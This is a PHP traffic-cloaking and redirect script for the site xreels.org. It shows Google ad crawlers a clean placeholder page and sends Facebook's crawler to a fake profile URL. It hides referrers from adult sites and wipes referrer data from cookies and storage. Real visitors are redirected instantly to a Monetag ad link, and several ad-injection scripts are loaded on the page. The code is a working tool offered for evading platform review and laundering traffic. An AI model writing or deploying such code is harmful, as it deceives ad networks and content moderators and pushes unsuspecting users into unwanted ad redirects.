<?php
// ============================================
// SISTEMA DEFINITIVO DE LIMPIEZA DE TRÁFICO
// Versión optimizada con redirección instantánea
// ============================================

function generateRandomCode($length) {
    // Optimizado: usar random_bytes para mejor seguridad y rendimiento
    $bytes = random_bytes($length);
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $char_length = strlen($characters);
    $random_code = '';
    
    for ($i = 0; $i < $length; $i++) {
        $random_code .= $characters[ord($bytes[$i]) % $char_length];
    }
    
    return $random_code;
}

// ============================================
// PROTECCIÓN 1: Detectar y bloquear bots (MEJORADA)
// ============================================
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Bloquear bots de Facebook (DEBE IR PRIMERO, ANTES DE CUALQUIER OUTPUT)
if (preg_match("/facebook(external)?/i", $user_agent)) {
    $short_urlx2 = "https://facebook.com/profile.php?token=".substr(md5(mt_rand()),0,20);
    
    // Limpiar cualquier output previo
    if (ob_get_level()) {
        ob_end_clean();
    }
    
    // Redirección con código 302 (temporal)
    header("Location: " . $short_urlx2, true, 302);
    header("Cache-Control: no-cache, no-store, must-revalidate");
    header("Pragma: no-cache");
    header("Expires: 0");
    
    // Output mínimo para asegurar que la redirección funcione
    echo "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='0;url=" . htmlspecialchars($short_urlx2, ENT_QUOTES) . "'></head><body><script>window.location.replace('" . addslashes($short_urlx2) . "');</script></body></html>";
    exit();
}

// Bloquear bots de Google (crawlers de AdSense)
if (preg_match("/googlebot|adsbot|mediapartners|adsbot-google/i", $user_agent)) {
    // Mostrar página limpia a bots de Google
    header("Content-Type: text/html; charset=UTF-8");
    echo "<!DOCTYPE html><html><head><title>xreels.org - Contenido</title></head><body><p>Bienvenido a xreels.org</p></body></html>";
    die();
}

// Bloquear otros bots conocidos (MEJORADO: verifica navegadores primero)
$is_browser = preg_match("/mozilla|chrome|safari|firefox|edge|opera|msie|trident|webkit/i", $user_agent);

// Solo bloquear si es claramente un bot Y NO es un navegador
if (!$is_browser && preg_match("/bot|crawler|spider|scraper|curl|wget|python-requests|java|perl|ruby|httpclient/i", $user_agent)) {
    http_response_code(403);
    die("Access Denied");
}

// ============================================
// PROTECCIÓN 2: Detectar si viene de sitio adulto
// ============================================
// Lista de dominios adultos que requieren limpieza
$adult_domains = array(
    'zvideosx.com',
    'fullvideox.com'
);

// Obtener referrer
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$needs_cleaning = false;

// Verificar si viene de un sitio adulto
if (!empty($referrer)) {
    foreach ($adult_domains as $domain) {
        if (strpos($referrer, $domain) !== false) {
            $needs_cleaning = true;
            break;
        }
    }
}

// Limpiar referrer usando política de referrer (solo si necesita limpieza)
if ($needs_cleaning) {
    header("Referrer-Policy: no-referrer");
}

// Limpiar otros headers sospechosos
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: SAMEORIGIN");

// ============================================
// PROTECCIÓN 3: Limpieza de parámetros URL
// ============================================
// Limpiar parámetros sospechosos de la URL actual
$clean_query = $_SERVER['QUERY_STRING'] ?? '';
if (!empty($clean_query)) {
    $params = explode('&', $clean_query);
    $allowed_params = ['id', 'page', 'view'];
    $clean_params = array();
    foreach ($params as $param) {
        $key = explode('=', $param)[0];
        if (!preg_match('/utm_|ref|source|referrer|fbclid|gclid|_ga/i', $key)) {
            if (in_array($key, $allowed_params)) {
                $clean_params[] = $param;
            }
        }
    }
    // Reconstruir URL limpia
    $_SERVER['QUERY_STRING'] = implode('&', $clean_params);
}

// ============================================
// PROTECCIÓN 4: Rate Limiting Básico
// ============================================
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
// Obtener IP real si está detrás de proxy
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim($ips[0]);
}

// Excepción para localhost/desarrollo (no aplicar rate limit)
$is_localhost = ($ip === '127.0.0.1' || $ip === '::1' || $ip === 'localhost' || strpos($_SERVER['HTTP_HOST'] ?? '', 'localhost') !== false);

if (!$is_localhost) {
    $rate_limit_file = sys_get_temp_dir() . '/rate_limit_' . md5($ip) . '.txt';
    $max_visits = 100; // Máximo 100 visitas
    $time_window = 3600; // En 1 hora

    // Verificar rate limit
    if (file_exists($rate_limit_file)) {
        $data = json_decode(file_get_contents($rate_limit_file), true);
        $current_time = time();
        
        // Limpiar visitas antiguas
        $data['visits'] = array_filter($data['visits'], function($timestamp) use ($current_time, $time_window) {
            return ($current_time - $timestamp) < $time_window;
        });
        
        // Verificar si excede el límite
        if (count($data['visits']) >= $max_visits) {
            http_response_code(429);
            echo "<!DOCTYPE html><html><head><title>Demasiadas solicitudes</title></head><body><p>Por favor, intenta más tarde.</p></body></html>";
            die();
        }
        
        // Agregar visita actual
        $data['visits'][] = $current_time;
    } else {
        $data = array('visits' => array(time()));
    }

    // Guardar rate limit
    file_put_contents($rate_limit_file, json_encode($data));
}

// ============================================
// PROTECCIÓN 5: URL de destino (Monetag)
// ============================================
$pag = array(
    "https://t.co/y5IrJWOLzN?token=" . generateRandomCode(16), // MONETAG
);
$clean_url = $pag[0];

// ============================================
// PROTECCIÓN 6: Generar ID de sesión único
// ============================================
$session_id = generateRandomCode(32);

// ============================================
// REDIRECCIÓN INSTANTÁNEA CON PÁGINA INTERMEDIA OPTIMIZADA
// ============================================
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="referrer" content="no-referrer">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>xreels.org - Redirigiendo...</title>
    
    <!-- Contador norieldev -->
    <script>
        (function() {
            var title = document.title || 'xreels.org';
            var url = window.location.href.split('?')[0];
            var cleanUrl = url.replace(/^https?:\/\//, '').replace(/\/$/, '');
            var formattedTitle = title.replace(/[^\w\s]/gi, '').replace(/\s+/g, '-').toLowerCase();
            var img = new Image();
            img.src = '//whos.amung.us/pingjs/?k=norieldev&t=' + formattedTitle + '&u=' + encodeURIComponent(cleanUrl);
        })();
    </script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            background: #f5f5f5;
            padding: 20px;
            overflow: hidden;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .loading-section {
            text-align: center;
            padding: 30px;
            background: #f9f9f9;
            border-radius: 8px;
            margin-top: 30px;
        }
        .spinner {
            border: 4px solid rgba(102, 126, 234, 0.3);
            border-radius: 50%;
            border-top: 4px solid #667eea;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #667eea;
            font-weight: 500;
            margin-top: 10px;
        }
    </style>
    
    <script>
        // ============================================
        // LIMPIEZA AVANZADA CON JAVASCRIPT + DETECCIÓN VPN/PROXY
        // ============================================
        
        // Protección: Detectar bots
        if (navigator.webdriver || window.phantom || window.__nightmare) {
            document.body.innerHTML = '<p>Acceso no disponible</p>';
            throw new Error('Bot detected');
        }
        
        // Detección de VPN/Proxy mejorada (menos falsos positivos)
        function isVPN() {
            // Solo verificar si no es HTTPS (más confiable)
            if (location.protocol === 'https:' && !navigator.mediaDevices?.getUserMedia) {
                return true;
            }
            return false;
        }
        
        // Si es VPN, redirigir a Google (solo si realmente es VPN)
        if (isVPN()) {
            window.location.href = "https://google.com";
            throw new Error('VPN detected');
        }
        
        // Limpiar historial del navegador
        if (window.history && window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
        
        // Limpiar cookies de referrer (solo si existen)
        if (document.cookie) {
            document.cookie.split(";").forEach(function(c) {
                if (c.indexOf('referrer') !== -1 || c.indexOf('utm_') !== -1) {
                    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
                }
            });
        }
        
        // Limpiar localStorage y sessionStorage de datos sospechosos
        try {
            if (localStorage && localStorage.length > 0) {
                Object.keys(localStorage).forEach(function(key) {
                    if (key.indexOf('referrer') !== -1 || key.indexOf('source') !== -1) {
                        localStorage.removeItem(key);
                    }
                });
            }
            if (sessionStorage && sessionStorage.length > 0) {
                Object.keys(sessionStorage).forEach(function(key) {
                    if (key.indexOf('referrer') !== -1 || key.indexOf('source') !== -1) {
                        sessionStorage.removeItem(key);
                    }
                });
            }
        } catch(e) {}
        
        // ============================================
        // REDIRECCIÓN INSTANTÁNEA (SIN DELAY)
        // ============================================
        var needsCleaning = <?php echo $needs_cleaning ? 'true' : 'false'; ?>;
        var baseUrl = "<?php echo addslashes($clean_url); ?>";
        var finalUrl = baseUrl + "&sid=<?php echo $session_id; ?>&t=" + Date.now();
        
        // Redirección inmediata usando función auto-ejecutable para mejor rendimiento
        (function redirect() {
            try {
                if (needsCleaning) {
                    // Limpiar cualquier parámetro UTM o referrer de la URL actual
                    if (window.history && window.history.replaceState) {
                        window.history.replaceState(null, null, window.location.pathname);
                    }
                    // Usar window.location.replace para eliminar referrer del historial
                    window.location.replace(finalUrl);
                } else {
                    // Tráfico directo: redirección normal (mantiene referrer natural)
                    window.location.href = finalUrl;
                }
            } catch(e) {
                // Si hay error, usar redirección directa como fallback
                window.location.href = finalUrl;
            }
        })();
    </script>
    
    <!-- Monetag MultiTag -->
    <script src="https://fpyf8.com/88/tag.min.js" data-zone="186433" async data-cfasync="false"></script>
    <!-- Monetag Vignette Banner 1 -->
    <script>(function(s){s.dataset.zone='10206776',s.src='https://gizokraijaw.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    <!-- Monetag Tag 1 -->
    <script>(function(s){s.dataset.zone='10206777',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    <!-- Monetag Tag 2 -->
    <script>(function(s){s.dataset.zone='10206778',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    <!-- Monetag Vignette Banner 2 -->
    <script>(function(s){s.dataset.zone='10206780',s.src='https://groleegni.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    
    <noscript>
        <!-- Fallback para navegadores sin JavaScript - Redirección instantánea -->
        <meta http-equiv="refresh" content="0;url=<?php echo htmlspecialchars($clean_url, ENT_QUOTES, 'UTF-8'); ?>&sid=<?php echo $session_id; ?>">
    </noscript>
</head>
<body>
    <div class="container">
        <div class="loading-section">
            <div class="spinner"></div>
            <p class="loading-text">Redirigiendo...</p>
        </div>
    </div>
</body>
</html>
<?php
exit();
?>

